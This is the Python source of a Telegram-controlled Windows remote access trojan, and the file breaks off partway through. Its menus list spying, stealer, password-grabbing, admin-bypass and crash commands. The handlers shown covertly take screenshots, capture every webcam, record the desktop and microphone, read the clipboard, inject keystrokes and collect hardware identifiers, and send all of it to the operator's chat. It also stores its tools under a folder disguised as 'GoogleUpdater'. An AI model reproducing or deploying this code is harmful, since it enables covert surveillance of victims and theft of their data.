import telebot
import pyautogui
import os
import json
import webbrowser
import shutil
import subprocess
import requests
import io
import time
import string
import threading
import asyncio
import logging
import socket
import platform
import psutil
import cv2
import ctypes
import pyttsx3
from pynput.keyboard import Controller as KeyboardController, Key, Listener
from pynput.mouse import Controller as MouseController, Button
from PIL import Image
from PyQt6.QtCore import Qt, QUrl
from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout, QLineEdit, QMainWindow
from PyQt6.QtWebEngineWidgets import QWebEngineView
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import sys
import psutil
import random
import pygetwindow as gw
import win32api
import win32con
import win32gui
import win32process
import win32clipboard
import win32file
import win32com.client
import re
import winreg
import numpy as np
import sounddevice as sd
import wave
import pygame
import pyaudio
import urllib.request
import zipfile
import winshell
import winreg
import shlex
import wmi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ForceReply
TOKEN = "{TOKEN}"

bot = telebot.TeleBot(TOKEN)

# –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
categories = {
    "user_interact": "üõ† User interact",
    "spying": "üïµÔ∏è Spying",
    "file_management": "üìÇ File Management",
    "windows_control": "üíª Windows Control",
    "internet_network": "üåê Internet & Network",
    "graphics_fun": "üé® Graphics & Fun",
    "console_processes": "‚öôÔ∏è Console & Processes",
    "admin_other": "üõ† Admin & Other",
    "stilir": "üê¶‚Äç‚¨õ St–µ–∞l–µr",
    "bot_menu": "ü§ñ Bot menu"
}

def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    for key, name in categories.items():
        markup.add(KeyboardButton(name))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –∫–∞—Ç–µ–≥–æ—Ä–∏—é:", reply_markup=main_menu())

@bot.message_handler(func=lambda message: message.text in categories.values())
def menu_handler(message):
    category = [key for key, value in categories.items() if value == message.text][0]
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    if category == "user_interact":
        markup.add(KeyboardButton("!sendtext"))
        markup.add(KeyboardButton("!mousemove"))
        markup.add(KeyboardButton("!changelang"))
        markup.add(KeyboardButton("!keybind"))
        markup.add(KeyboardButton("!textbox"))
        markup.add(KeyboardButton("!msgbox"))
    elif category == "spying":
        markup.add(KeyboardButton("!photo_desk"))
        markup.add(KeyboardButton("!photo_cam"))
        markup.add(KeyboardButton("!video_desk"))
        markup.add(KeyboardButton("!video_cam"))
        markup.add(KeyboardButton("!audiorec"))
        markup.add(KeyboardButton("!keylogger [‚ö†Ô∏èFIXING]"))
        markup.add(KeyboardButton("!clipboard"))
        markup.add(KeyboardButton("!sysinfo"))
    elif category == "file_management":
        markup.add(KeyboardButton("!findfiles"))
        markup.add(KeyboardButton("!upload"))
        markup.add(KeyboardButton("!delete"))
        markup.add(KeyboardButton("!execute"))
        markup.add(KeyboardButton("!download"))
        markup.add(KeyboardButton("!disk"))
        markup.add(KeyboardButton("!autoload"))
    elif category == "windows_control":
        markup.add(KeyboardButton("!shutdown"))
        markup.add(KeyboardButton("!sleep"))
        markup.add(KeyboardButton("!restart"))
        markup.add(KeyboardButton("!lock"))
        markup.add(KeyboardButton("!volume"))
        markup.add(KeyboardButton("!lockmgr"))
        markup.add(KeyboardButton("!achbypass"))
        markup.add(KeyboardButton("!unlocksound"))
        markup.add(KeyboardButton("!Microlist"))
        markup.add(KeyboardButton("!swapkeys"))
    elif category == "internet_network":
        markup.add(KeyboardButton("!openurl"))
        markup.add(KeyboardButton("!wifilist"))
        markup.add(KeyboardButton("!ping"))
        markup.add(KeyboardButton("!packet"))
        markup.add(KeyboardButton("!netinfo"))
        markup.add(KeyboardButton("!wifipass"))
    elif category == "graphics_fun":
        markup.add(KeyboardButton("!fakeupdate"))
        markup.add(KeyboardButton("!draw"))
        markup.add(KeyboardButton("!wallpaper"))
        markup.add(KeyboardButton("!trail"))
        markup.add(KeyboardButton("!memz"))
        markup.add(KeyboardButton("!invert"))
        markup.add(KeyboardButton("!flipscreen"))
        markup.add(KeyboardButton("!cd"))
        markup.add(KeyboardButton("!rickroll"))
        markup.add(KeyboardButton("!tts"))
        markup.add(KeyboardButton("!sound"))
        markup.add(KeyboardButton("!shake"))
    elif category == "console_processes":
        markup.add(KeyboardButton("!tasklist"))
        markup.add(KeyboardButton("!taskkill"))
        markup.add(KeyboardButton("!taskmake"))
        markup.add(KeyboardButton("!cmd"))
        markup.add(KeyboardButton("!powershell"))
        markup.add(KeyboardButton("!bsod"))
    elif category == "admin_other":
        markup.add(KeyboardButton("!checkadmin"))
        markup.add(KeyboardButton("!admin"))
        markup.add(KeyboardButton("!legitadmin"))
        markup.add(KeyboardButton("!acbypass"))
        markup.add(KeyboardButton("!suicide"))
    elif category == "bot_menu":
        markup.add(KeyboardButton("!help"))
    elif category == "stilir":
        markup.add(KeyboardButton("!discordcheck"))
    markup.add(KeyboardButton("üîô –ù–∞–∑–∞–¥"))
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "üîô –ù–∞–∑–∞–¥")
def back_handler(message):
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –∫–∞—Ç–µ–≥–æ—Ä–∏—é:", reply_markup=main_menu())

#----–§–£–ù–ö–¶–ò–ò –°–Æ–î–ê---

@bot.message_handler(func=lambda message: message.text == "!sendtext")
def sendtext_handler(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è –≤–≤–æ–¥–∞ –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ:")
    bot.register_next_step_handler(msg, process_sendtext)

def process_sendtext(message):
    keyboard = KeyboardController()
    text = message.text
    for char in text:
        keyboard.type(char)
        time.sleep(0.05)
    bot.send_message(message.chat.id, f"‚úÖ –í–≤–µ–¥—ë–Ω —Ç–µ–∫—Å—Ç: {text}")

from pynput.mouse import Controller as MouseController, Button

mouse = MouseController()

@bot.message_handler(func=lambda message: message.text == "!mousemove")
def mousemove_handler(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ—Ä–æ—Å—Ç—å –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 20):")
    bot.register_next_step_handler(msg, process_mousemove)

def process_mousemove(message):
    try:
        speed = int(message.text)
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton("‚¨ÖÔ∏è"), KeyboardButton("‚û°Ô∏è"))
        markup.add(KeyboardButton("‚¨ÜÔ∏è"), KeyboardButton("‚¨áÔ∏è"))
        markup.add(KeyboardButton("–õ–ö–ú"), KeyboardButton("–ü–ö–ú"))
        markup.add(KeyboardButton("‚ùå –ó–∞–∫—Ä—ã—Ç—å"))
        bot.send_message(message.chat.id, "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –º—ã—à—å—é:", reply_markup=markup)

        @bot.message_handler(func=lambda msg: msg.text in ["‚¨ÖÔ∏è", "‚û°Ô∏è", "‚¨ÜÔ∏è", "‚¨áÔ∏è", "–õ–ö–ú", "–ü–ö–ú", "‚ùå –ó–∞–∫—Ä—ã—Ç—å"])
        def move_mouse(msg):
            if msg.text == "‚¨ÖÔ∏è":
                mouse.move(-speed, 0)
            elif msg.text == "‚û°Ô∏è":
                mouse.move(speed, 0)
            elif msg.text == "‚¨ÜÔ∏è":
                mouse.move(0, -speed)
            elif msg.text == "‚¨áÔ∏è":
                mouse.move(0, speed)
            elif msg.text == "–õ–ö–ú":
                mouse.click(Button.left)
            elif msg.text == "–ü–ö–ú":
                mouse.click(Button.right)
            elif msg.text == "‚ùå –ó–∞–∫—Ä—ã—Ç—å":
                bot.send_message(msg.chat.id, "‚ùå –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à—å—é –æ—Ç–∫–ª—é—á–µ–Ω–æ.", reply_markup=main_menu())
                return
            bot.register_next_step_handler(msg, move_mouse)

    except ValueError:
        bot.send_message(message.chat.id, "‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏!")

@bot.message_handler(func=lambda message: message.text == "!changelang")
def changelang_handler(message):
    keyboard.press(Key.alt)
    keyboard.press(Key.shift)
    keyboard.release(Key.shift)
    keyboard.release(Key.alt)
    bot.send_message(message.chat.id, "‚úÖ –Ø–∑—ã–∫ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –∏–∑–º–µ–Ω—ë–Ω")

@bot.message_handler(func=lambda message: message.text == "!keybind")
def keybind_handler(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –∫–ª–∞–≤–∏—à (–ø—Ä–∏–º–µ—Ä: Ctrl+Shift+Esc):")
    bot.register_next_step_handler(msg, process_keybind)

def process_keybind(message):
    try:
        keys = message.text.replace("+", " ")
        subprocess.run(["powershell", "-Command", f"(New-Object -ComObject WScript.Shell).SendKeys('{keys}')"], creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "‚úÖ –ö–æ–º–±–∏–Ω–∞—Ü–∏—è –∫–ª–∞–≤–∏—à –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {e}")

class TextBoxWindow(QWidget):
    def __init__(self, text, buttons, chat_id):
        super().__init__()
        self.chat_id = chat_id
        self.setWindowTitle("Input Box")
        self.setGeometry(200, 200, 400, 200)
        self.input_text = ""

        layout = QVBoxLayout()
        self.label = QLabel(text)
        layout.addWidget(self.label)

        self.input_field = QLineEdit(self)
        layout.addWidget(self.input_field)

        btn_layout = QHBoxLayout()
        for btn_text in buttons:
            btn = QPushButton(btn_text, self)
            btn.clicked.connect(lambda _, b=btn_text: self.on_button_click(b))
            btn_layout.addWidget(btn)
        
        layout.addLayout(btn_layout)
        self.setLayout(layout)

    def on_button_click(self, btn_text):
        self.input_text = self.input_field.text()
        bot.send_message(self.chat_id, f"**–í—ã–±—Ä–∞–Ω–æ:** {btn_text}\n**–í–≤–µ–¥—ë–Ω —Ç–µ–∫—Å—Ç:** {self.input_text}")
        self.close()

def run_gui(text, buttons, chat_id):
    app = QApplication(sys.argv)
    window = TextBoxWindow(text, buttons, chat_id)
    window.show()
    app.exec()

@bot.message_handler(func=lambda message: message.text == "!textbox")
def textbox_handler(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è –æ–∫–Ω–∞ –≤–≤–æ–¥–∞:")
    bot.register_next_step_handler(msg, process_textbox_text)

def process_textbox_text(message):
    text = message.text
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–Ω–æ–ø–∫–∏ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é (–Ω–∞–ø—Ä–∏–º–µ—Ä: OK,Cancel):")
    bot.register_next_step_handler(msg, process_textbox_buttons, text, message.chat.id)

def process_textbox_buttons(message, text, chat_id):
    buttons = message.text.split(",") if message.text else ["OK"]
    threading.Thread(target=run_gui, args=(text, buttons, chat_id), daemon=True).start()
    bot.send_message(chat_id, "‚úÖ –û–∫–Ω–æ —Å–æ–∑–¥–∞–Ω–æ –Ω–∞ –ü–ö")

@bot.message_handler(func=lambda message: message.text == "!msgbox")
def msgbox_handler(message):
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –æ–∫–Ω–∞:")
    bot.register_next_step_handler(msg, process_msgbox_title)

def process_msgbox_title(message):
    title = message.text
    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è:")
    bot.register_next_step_handler(msg, process_msgbox_text, title)

def process_msgbox_text(message, title):
    text = message.text
    script = f'''
    Add-Type -AssemblyName PresentationFramework;
    [System.Windows.MessageBox]::Show('{text}', '{title}');
    '''
    try:
        subprocess.Popen(["powershell", "-Command", script], creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ MSGBOX.")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(func=lambda message: message.text == "!photo_desk")
def photo_desk_handler(message):
    try:
        screenshot = pyautogui.screenshot()
        image_binary = io.BytesIO()
        screenshot.save(image_binary, format="PNG")
        image_binary.seek(0)
        
        bot.send_photo(message.chat.id, image_binary, caption="üñ•Ô∏è –≠–∫—Ä–∞–Ω 1")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {e}")

def capture_webcams():
    images = []
    index = 0
    while True:
        cap = cv2.VideoCapture(index)
        if not cap.isOpened():
            break  # –ï—Å–ª–∏ –∫–∞–º–µ—Ä–∞ –Ω–µ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç—Å—è, –∑–Ω–∞—á–∏—Ç, –±–æ–ª—å—à–µ –∏—Ö –Ω–µ—Ç
        ret, frame = cap.read()
        if ret:
            _, img_encoded = cv2.imencode('.png', frame)
            images.append(io.BytesIO(img_encoded.tobytes()))
        cap.release()
        index += 1
    return images

@bot.message_handler(func=lambda message: message.text == "!photo_cam")
def photo_cam_handler(message):
    try:
        images = capture_webcams()
        if not images:
            bot.send_message(message.chat.id, "‚ùå –ö–∞–º–µ—Ä—ã –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã!")
            return
        
        for i, image_binary in enumerate(images):
            image_binary.seek(0)
            bot.send_photo(message.chat.id, image_binary, caption=f"üì∏ –í–µ–±-–∫–∞–º–µ—Ä–∞ #{i+1}")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {e}")

#ffmpeg

FFMPEG_PATH = os.path.join(os.getenv("APPDATA"), "GoogleUpdater", "files", "ffmpeg.exe")
VIDEO_PATH = os.path.join(os.getenv("APPDATA"), "GoogleUpdater", "files", "data")
os.makedirs(VIDEO_PATH, exist_ok=True)

def download_ffmpeg():
    if not os.path.exists(FFMPEG_PATH):
        url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
        zip_path = os.path.join(VIDEO_PATH, "ffmpeg.zip")
        exe_dir = os.path.join(VIDEO_PATH, "ffmpeg")
        return url, zip_path, exe_dir
    return None, None, None

@bot.message_handler(func=lambda message: message.text == "!video_desk")
def video_desk_handler(message):
    msg = bot.send_message(message.chat.id, "‚è≥ –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ FFMPEG...")
    url, zip_path, exe_dir = download_ffmpeg()
    
    if url:
        bot.edit_message_text("üì• –ó–∞–≥—Ä—É–∂–∞–µ–º FFMPEG...", message.chat.id, msg.message_id)
        try:
            response = requests.get(url, stream=True)
            with open(zip_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            bot.edit_message_text("üìÇ –†–∞—Å–ø–∞–∫–æ–≤—ã–≤–∞–µ–º...", message.chat.id, msg.message_id)
            subprocess.run(["powershell", "Expand-Archive", "-Path", zip_path, "-DestinationPath", exe_dir, "-Force"], creationflags=subprocess.CREATE_NO_WINDOW)
            
            ffmpeg_bin_path = os.path.join(exe_dir, "ffmpeg-7.1-essentials_build", "bin", "ffmpeg.exe")
            if os.path.exists(ffmpeg_bin_path):
                shutil.move(ffmpeg_bin_path, FFMPEG_PATH)
            else:
                bot.edit_message_text("‚ùå –û—à–∏–±–∫–∞: FFMPEG.exe –Ω–µ –Ω–∞–π–¥–µ–Ω –ø–æ—Å–ª–µ —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∏", message.chat.id, msg.message_id)
                return
            
            os.remove(zip_path)
            bot.edit_message_text("‚úÖ FFMPEG —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!", message.chat.id, msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ: {e}", message.chat.id, msg.message_id)
            return
    else:
        bot.edit_message_text("‚úÖ FFMPEG —É–∂–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω", message.chat.id, msg.message_id)

    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 10s –∏–ª–∏ 1m):")
    bot.register_next_step_handler(msg, process_video_duration)

def process_video_duration(message):
    time_map = {"s": 1, "m": 60}
    duration = message.text
    unit = duration[-1]

    if unit not in time_map or not duration[:-1].isdigit():
        bot.send_message(message.chat.id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –≤—Ä–µ–º–µ–Ω–∏! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ 10s –∏–ª–∏ 1m.")
        return
    
    seconds = int(duration[:-1]) * time_map[unit]
    output_file = os.path.join(VIDEO_PATH, "output.mp4")

    bot.send_message(message.chat.id, "üé• –ó–∞–ø–∏—Å—å –Ω–∞—á–∞–ª–∞—Å—å...")

    try:
        command = f'"{FFMPEG_PATH}" -y -f gdigrab -framerate 30 -t {seconds} -i desktop "{output_file}"'
        subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        with open(output_file, "rb") as video:
            bot.send_video(message.chat.id, video)
        
        os.remove(output_file)
        bot.send_message(message.chat.id, "‚úÖ –ó–∞–ø–∏—Å—å –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {e}")


#ffmpeg


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ
def record_audio(microphone, duration, filename):
    p = pyaudio.PyAudio()

    # –û—Ç–∫—Ä—ã–≤–∞–µ–º –ø–æ—Ç–æ–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–æ–º
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    input=True,
                    input_device_index=microphone['index'],
                    frames_per_buffer=1024)

    print(f"Recording from {microphone['name']} for {duration} seconds...")

    frames = []
    for _ in range(0, int(44100 / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)

    # –ó–∞–≤–µ—Ä—à–∞–µ–º –∑–∞–ø–∏—Å—å
    print("Recording complete.")
    stream.stop_stream()
    stream.close()
    p.terminate()

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
    if not os.path.exists(VIDEO_PATH):
        os.makedirs(VIDEO_PATH)

    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))

# –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –º–∏–∫—Ä–æ—Ñ–æ–Ω–æ–≤
def get_microphone_list():
    p = pyaudio.PyAudio()
    microphone_list = []
    for i in range(p.get_device_count()):
        device_info = p.get_device_info_by_index(i)
        if device_info.get('maxInputChannels') > 0:  # –¢–æ–ª—å–∫–æ –º–∏–∫—Ä–æ—Ñ–æ–Ω—ã
            microphone_list.append({
                'index': i,
                'name': device_info.get('name')
            })
    return microphone_list

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥, –Ω–∞—á–∏–Ω–∞—é—â–∏—Ö—Å—è —Å "!"
@bot.message_handler(func=lambda message: message.text.startswith('!audiorec'))
def audiorec(message):
    bot.send_message(message.chat.id, "üé§ –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞:")

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –æ–∂–∏–¥–∞–Ω–∏—è –≤–≤–æ–¥–∞ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
    bot.register_next_step_handler(message, get_microphone)

def get_microphone(message):
    query = message.text.lower()  # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –∑–∞–ø—Ä–æ—Å –≤ –Ω–∏–∂–Ω–∏–π —Ä–µ–≥–∏—Å—Ç—Ä
    microphones = get_microphone_list()
    found_mics = [mic for mic in microphones if query in mic['name'].lower()]

    if found_mics:
        mic = found_mics[0]  # –ï—Å–ª–∏ –Ω–∞—à–ª–∏ —Ö–æ—Ç—è –±—ã –æ–¥–∏–Ω –º–∏–∫—Ä–æ—Ñ–æ–Ω, –≤—ã–±–∏—Ä–∞–µ–º –ø–µ—Ä–≤—ã–π –∏–∑ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö
        bot.send_message(message.chat.id, f"‚úÖ –ù–∞—à–ª–∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω: {mic['name']}. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 10s –∏–ª–∏ 2m):")
        bot.register_next_step_handler(message, get_duration, mic)  # –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —à–∞–≥—É
    else:
        bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω —Å —Ç–∞–∫–∏–º –Ω–∞–∑–≤–∞–Ω–∏–µ–º. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")

def get_duration(message, microphone):
    duration_str = message.text

    # –†–∞–∑–±–æ—Ä –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏
    try:
        if duration_str.endswith('s'):
            duration = int(duration_str[:-1])
        elif duration_str.endswith('m'):
            duration = int(duration_str[:-1]) * 60
        else:
            raise ValueError("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ 's' –∏–ª–∏ 'm'.")
    except ValueError as e:
        bot.reply_to(message, f"–û—à–∏–±–∫–∞: {str(e)}")
        return

    # –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ
    filename = os.path.join(VIDEO_PATH, "audio_recording.wav")
    record_audio(microphone, duration, filename)

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –≤ Telegram
    with open(filename, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
    os.remove(filename)

#--keyboard

@bot.message_handler(func=lambda message: message.text.startswith('!clipboard'))
def handle_clipboard(message):
    """–î–æ–±–∞–≤–ª—è–µ—Ç –∏–ª–∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞."""
    args = message.text.split(' ', 2)
    
    if len(args) < 2:
        bot.send_message(message.chat.id, "‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `!clipboard add <text>` –∏–ª–∏ `!clipboard show`")
        return
    
    action = args[1].lower()
    
    if action == "add" and len(args) > 2:
        text = args[2]
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        bot.send_message(message.chat.id, "üìã –¢–µ–∫—Å—Ç –¥–æ–±–∞–≤–ª–µ–Ω –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞!")

    elif action == "show":
        win32clipboard.OpenClipboard()
        try:
            clipboard_content = win32clipboard.GetClipboardData()
        except TypeError:
            clipboard_content = "[–ü—É—Å—Ç–æ –∏–ª–∏ –Ω–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–π —Ñ–æ—Ä–º–∞—Ç]"
        win32clipboard.CloseClipboard()

        if len(clipboard_content) > 2000:
            clipboard_content = clipboard_content[:1990] + "..."

        bot.send_message(message.chat.id, f"üìã –°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞: `{clipboard_content}`")

    else:
        bot.send_message(message.chat.id, "‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `!clipboard add <text>` –∏–ª–∏ `!clipboard show`")

async def send_sysinfo(message):
    """Shows detailed system information."""
    try:
        uname = platform.uname()
        user = os.getlogin()
        pc_name = socket.gethostname()
        cpu_info = platform.processor()
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        total_ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # Convert to GB
        os_version = f"{uname.system} {uname.release} ({uname.version})"
        arch = platform.architecture()[0]
        disk_usage = psutil.disk_usage("/")
        gpu_info = "Unknown"
        cpu_serial = "Unknown"
        cpu_frequency = "Unknown"
        motherboard = "Unknown"
        disk_serial = "Unknown"
        gpu_vram = "Unknown"
        mac_addresses = []

        # Getting system information via WMI
        try:
            w = wmi.WMI()

            # CPU details
            cpu = w.Win32_Processor()[0]
            cpu_info = cpu.Name.strip()
            cpu_serial = cpu.ProcessorId.strip()
            cpu_frequency = f"{cpu.MaxClockSpeed} MHz"

            # GPU details
            gpus = w.Win32_VideoController()
            if gpus:
                gpu_info = ", ".join(gpu.Name.strip() for gpu in gpus)
                vram_list = []
                for gpu in gpus:
                    if gpu.AdapterRAM is not None:
                        vram_list.append(f"{int(gpu.AdapterRAM / (1024**3))} GB")
                    else:
                        vram_list.append("Unknown")
                gpu_vram = ", ".join(vram_list)

            # Motherboard details
            board = w.Win32_BaseBoard()[0]
            motherboard = f"{board.Manufacturer.strip()} {board.Product.strip()}"

            # Disk details
            disk = w.Win32_DiskDrive()[0]
            disk_serial = disk.SerialNumber.strip()

        except Exception as e:
            gpu_info = "WMI error"
            gpu_vram = "WMI error"

        # Getting MAC addresses
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac_addresses.append(f"{iface}: {addr.address}")

        mac_addresses_str = "\n".join(mac_addresses) if mac_addresses else "No MAC addresses found"

        # Check admin rights
        is_admin = "Yes" if ctypes.windll.shell32.IsUserAnAdmin() else "No"

        # Get the script's full path
        exe_path = os.path.abspath(sys.argv[0])

        info_message = (
            f"üñ• **System Information**\n"
            f"üîπ OS: `{os_version}`\n"
            f"üîπ Architecture: `{arch}`\n"
            f"üîπ User: `{user}`\n"
            f"üîπ PC Name: `{pc_name}`\n"
            f"üîπ Admin Rights: `{is_admin}`\n"
            f"üîπ Executable Path: `{exe_path}`\n\n"
            f"‚öô **Hardware**\n"
            f"üîπ CPU: `{cpu_info}`\n"
            f"üîπ CPU Frequency: `{cpu_frequency}`\n"
            f"üîπ CPU Serial: `{cpu_serial}`\n"
            f"üîπ Cores: `{cpu_cores}` | Threads: `{cpu_threads}`\n"
            f"üîπ RAM: `{total_ram} GB`\n"
            f"üîπ GPU: `{gpu_info}`\n"
            f"üîπ GPU VRAM: `{gpu_vram}`\n"
            f"üîπ Disk Usage: `{disk_usage.percent}% used`\n"
            f"üîπ Disk Serial: `{disk_serial}`\n"
            f"üîπ Motherboard: `{motherboard}`\n\n"
            f"üåê **Network**\n"
            f"```{mac_addresses_str}```"
        )

        bot.send_message(message.chat.id, info_message)
    except Exception as e:
        await bot.send_message(message.chat.id, f"‚ùå Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!sysinfo'))
def handle_sysinfo(message):
    # –í–º–µ—Å—Ç–æ —Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –¥–µ–ª–∞–µ–º –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–π —á–µ—Ä–µ–∑ asyncio
    asyncio.run(send_sysinfo(message))

@bot.message_handler(func=lambda message: message.text.startswith('!upload'))
def upload(message):
